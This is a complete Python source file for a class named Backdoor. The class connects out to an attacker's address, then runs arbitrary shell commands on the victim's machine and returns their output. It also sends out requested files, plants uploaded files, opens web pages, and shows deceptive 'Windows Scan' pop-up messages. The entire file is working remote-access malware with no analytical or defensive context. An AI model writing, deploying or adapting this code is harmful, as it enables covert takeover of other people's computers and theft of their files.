import socket
import subprocess
import json
import os
import base64
import tkinter.messagebox as msgbox
import webbrowser
from address import IP_ADDR, PORT


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_sys_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recv(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError or json.decoder.JSONDecodeError:
                continue
            except ConnectionResetError:
                exit()

    def change_directory(self, path):
        try:
            os.chdir(path)
            return ('[+] Changing working directory to ' + path).encode()
        except FileNotFoundError:
            return ('[X] Requested directory not found').encode()
        except OSError:
            return ('[X] The filename, directory name, or volume label syntax is incorrect').encode()

    def download_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except FileNotFoundError:
            return base64.b64encode(b'[X] Requested File Not Found')
        except OSError:
            return base64.b64encode(b'[X] Invalid argument')

    def upload_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(base64.b64decode(content))
                return b'[+] Uploaded the file successfully'
        except OSError:
            return b'[-] Wrong Argument'

    def open_site(self, site):
        try:
            webbrowser.get().open(site)
            return b'[+] Opened the requested URL'
        except Exception:
            return b'[-] Failed to process requested URL'

    def message_box(self, msg):
        try:
            msg = ' '.join(msg)
            msgbox.showinfo(title="Windows Scan", message=msg)
            return b'[+] Message sent'
        except:
            return b'[-] Failed to send message'

    def start(self):
        while True:
            command = self.reliable_recv()
            if command[0] == 'cd' and len(command) > 1:
                path = ' '.join(command[1:])
                output = self.change_directory(path)
            elif command[0] == 'ls':
                output = self.execute_sys_command('dir')
            elif command[0] == 'download' and len(command) > 1:
                path = ' '.join(command[1:])
                output = self.download_file(path)
            elif command[0] == 'upload' and len(command) > 1:
                path = ' '.join(command[1:-1])
                output = self.upload_file(path, command[-1])
            elif command[0] == 'site' and len(command) > 1:
                output = self.open_site(command[1])     
            elif command[0] == 'msg' and len(command) > 1:
                output = self.message_box(command[1:])
            else:
                command = ' '.join(command)
                try:
                    output = self.execute_sys_command(command)
                except subprocess.CalledProcessError:
                    output = b'[-] Wrong command entered'

            self.reliable_send(base64.b64encode(output).decode()) # here we converted the output to string

my_backdoor = Backdoor(IP_ADDR, PORT)
my_backdoor.start()
